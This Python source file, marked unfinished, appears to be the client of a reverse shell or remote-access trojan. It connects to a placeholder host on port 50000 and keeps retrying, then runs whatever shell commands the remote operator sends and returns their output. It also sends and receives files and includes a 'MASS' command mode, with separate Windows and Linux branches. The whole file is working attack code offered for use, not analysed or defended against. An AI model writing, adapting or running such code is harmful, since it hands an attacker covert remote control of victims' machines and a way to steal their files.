import os
import sys
import time
import socket
import subprocess


# UNFINISHED


host = "YOUR HOST"
port = 50000


def launcher():
    OS = sys.platform
    if "linux" in OS:
        lin_main()
    elif "win" in OS:
        win_main()
    else:
        sys.exit()


def lin_main():
    create_socket()
    connect_to_host()
    lin_recv_commands()

def win_main():
    create_socket()
    connect_to_host()
    win_recv_commands()


def create_socket():
    global host
    global port
    global client
    working = 0
    while working < 1:
        try:
            client = socket.socket()
            working = 1
        except:
            time.sleep(5)


def connect_to_host():
    global host
    global port
    global client
    working = 0
    while working < 1:
        try:
            client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client.connect((host, port))
            working = 1
        except:
            time.sleep(5)


def recv_file(file_name):
    global host
    global port
    global client
    timer = 0
    client.sendall(str.encode("START"))
    remaining = int.from_bytes(client.recv(4096), "big")
    requested_file_size = remaining
    with open(file_name, "wb") as f:
        while remaining:
            data = client.recv(min(remaining, 4096))
            remaining -= len(data)
            f.write(data)
            if not data:
                timer += 1
                time.sleep(5)
                if timer == 5:
                    break
    received_file_size = os.path.getsize(file_name)
    if requested_file_size == received_file_size:
        client.sendall(str.encode("Full_file_received"))
    else:
        msg = "THIS_IS_NOT_THE_COMPLETE_FILE_BITCH,_YOU_HAD_ONE_FUCKING_JOB!!!"
        client.sendall(msg.encode("utf8"))


def send_file(file_name):
    global host
    global port
    global client
    exists = os.path.isfile(file_name)
    if exists == True:
        file_size_in_bytes = str(os.path.getsize(file_name))
        client.sendall(str.encode(file_size_in_bytes))
        data = client.recv(4096)
        response = data.decode("utf8")
        if response == "START":
            file_size = 0
            with open(file_name, "rb") as f:
                for i in f:
                    file_size += len(i)
            client.sendall(file_size.to_bytes(4096, "big"))
            with open(file_name, "rb") as f:
                for i in f:
                    client.sendall(i)
    else:
        msg = "No such file or directory!" + "\n"
        cwd = os.getcwd() + "$ "
        client.send(msg.encode("utf8") + cwd.encode("utf8"))

#=======================================================================================================


# For windows


def win_recv_commands():
    global host
    global port
    global client
    while True:
        try:
            data = client.recv(65535)
            command = data.decode("utf8")
            if command == "empty":
                cwd = os.getcwd() + "> "
                client.sendall(cwd.encode("utf8"))
            elif command == "you there?":
                connection_confirmation = "yep"
                client.sendall(connection_confirmation.encode("utf8"))
            elif command == "PLATFORM":
                P = sys.platform
                client.sendall(P.encode("utf8"))
            elif command[:8] == "download":
                send_file(command[9:])
            elif command[:6] == "upload":
                recv_file(command[7:])
            elif command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                    cwd = os.getcwd() + "> "
                    client.sendall(cwd.encode("utf8"))
                except:
                    msg = "No such directory" + "\n"
                    cwd = os.getcwd() + "> "
                    client.sendall(msg.encode("utf8") + cwd.encode("utf8"))







            elif command[:4] == "MASS" and command[6:] == "hithere":
                print(command)

            elif command[:3] == "BGP":
                try:
                    out = subprocess.Popen(command[4:], shell=True, stdin=False, stdout=False,  stderr=False)
                    cwd = os.getcwd() + "> "
                    client.sendall(cwd.encode("utf8"))

                except:
                    msg = "Command not allowed, type \"help\" for more information!" + "\n"
                    cwd = os.getcwd() + "> "
                    client.sendall(msg.encode("utf8") + cwd.encode("utf8"))



            elif command[:4] == "MASS":
                subprocess.Popen(command[5:], shell=True, stdin=False, stdout=False,  stderr=False)



            else:
                try:
                    out = subprocess.check_output(command, shell=True,  stderr=False)
                    cwd = os.getcwd() + "> "
                    client.sendall(out + cwd.encode("utf8"))

                except:
                    msg = "Command not allowed, type \"help\" for more information!" + "\n"
                    cwd = os.getcwd() + "> "
                    client.sendall(msg.encode("utf8") + cwd.encode("utf8"))
        except:
            print("Retrying ...")
            launcher()
            break



# =====================================================================================



# For linux


def lin_recv_commands():
    global host
    global port
    global client
    global connected
    while True:
        try:
            data = client.recv(65535)
            command = data.decode("utf8")
            if command == "empty":
                cwd = os.getcwd() + "$ "
                client.sendall(cwd.encode("utf8"))
            elif command == "you there?":
                connection_confirmation = "yep"
                client.sendall(connection_confirmation.encode("utf8"))
            elif command == "PLATFORM":
                P = sys.platform
                client.sendall(P.encode("utf8"))
            elif command[:8] == "download":
                send_file(command[9:])
            elif command[:6] == "upload":
                recv_file(command[7:])
            elif command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                    cwd = os.getcwd() + "$ "
                    client.sendall(cwd.encode("utf8"))
                except:
                    msg = "No such directory" + "\n"
                    cwd = os.getcwd() + "$ "
                    client.sendall(msg.encode("utf8") + cwd.encode("utf8"))







            elif command[:4] == "MASS" and command[5:] == "hithere":
                print(command)





            elif command[:3] == "BGP":
                try:
                    out = subprocess.Popen(command[4:], shell=True, stdin=False, stdout=False, stderr=False)
                    cwd = os.getcwd() + "$ "
                    client.sendall(cwd.encode("utf8"))

                except:
                    msg = "Command not found!" + "\n"
                    cwd = os.getcwd() + "$ "
                    client.sendall(msg.encode("utf8") + cwd.encode("utf8"))



            elif command[:4] == "MASS":
                subprocess.Popen(command[5:], shell=True, stdin=False, stdout=False, stderr=False)



            else:
                try:
                    out = subprocess.check_output(command, shell=True, stderr=False)
                    cwd = os.getcwd() + "$ "
                    client.sendall(out + cwd.encode("utf8"))

                except:
                    msg = "Command not found!" + "\n"
                    cwd = os.getcwd() + "$ "
                    client.sendall(msg.encode("utf8") + cwd.encode("utf8"))
        except:
            print("Retrying ...")
            launcher()
            break






launcher()

